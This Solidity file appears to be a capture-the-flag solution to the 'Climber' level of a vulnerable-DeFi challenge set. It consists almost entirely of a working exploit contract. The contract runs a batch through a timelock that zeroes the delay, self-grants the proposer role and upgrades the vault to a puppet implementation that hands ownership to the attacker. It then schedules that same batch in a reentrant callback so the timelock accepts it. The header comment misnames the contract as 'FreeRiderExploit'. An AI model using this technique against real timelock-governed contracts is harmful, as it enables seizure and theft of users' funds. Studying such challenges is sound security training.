// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PROPOSER_ROLE} from "./ClimberConstants.sol";
import {ClimberTimelock} from "./ClimberTimelock.sol";
import {ClimberVault} from "./ClimberVault.sol";
import {ClimberVaultPuppet} from "./ClimberVaultPuppet.sol";

/**
 * @title FreeRiderExploit
 * @author scorpion9979
 */
contract ClimberExploit {
    address private immutable eoa;
    ClimberTimelock private immutable timelock;
    ClimberVault private immutable vault;

    // dataElements
    bytes[] dataElements = new bytes[](4);

    constructor(ClimberTimelock timelock_, ClimberVault vault_) {
        eoa = msg.sender;
        timelock = timelock_;
        vault = vault_;
    }

    function exploit() public {
        // targets
        address[] memory targets = new address[](4);
        targets[0] = address(timelock);
        targets[1] = address(timelock);
        targets[2] = address(vault);
        targets[3] = address(this);

        // values
        uint256[] memory values = new uint256[](4);

        // salt
        bytes32 salt = 0;

        // 1. call `updateDelay` to set delay to 0 for immediate execution.
        dataElements[0] = abi.encodeWithSignature("updateDelay(uint64)", 0);

        // 2. call `grantRole` to self-grant `PROPOSER_ROLE`.
        dataElements[1] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            PROPOSER_ROLE,
            address(this)
        );

        // 3. upgrade ClimberVault to a new implementation that sets the `owner` and `_sweeper` to the exploit EOA.
        dataElements[2] = abi.encodeWithSignature(
            "upgradeToAndCall(address,bytes)",
            address(new ClimberVaultPuppet()),
            abi.encodeWithSignature("initialize(address)", eoa)
        );

        // 4. invoke callback that calls `schedule` to schedule a new operation, which will immediately be ready for execution after the call.
        dataElements[3] = abi.encodeWithSignature(
            "callback(address[],uint256[],bytes32)",
            targets,
            values,
            salt
        );

        timelock.execute({
            targets: targets,
            values: values,
            dataElements: dataElements,
            salt: salt
        });
    }

    function callback(
        address[] calldata targets,
        uint256[] calldata values,
        bytes32 salt
    ) external {
        timelock.schedule({
            targets: targets,
            values: values,
            dataElements: dataElements,
            salt: salt
        });
    }
}
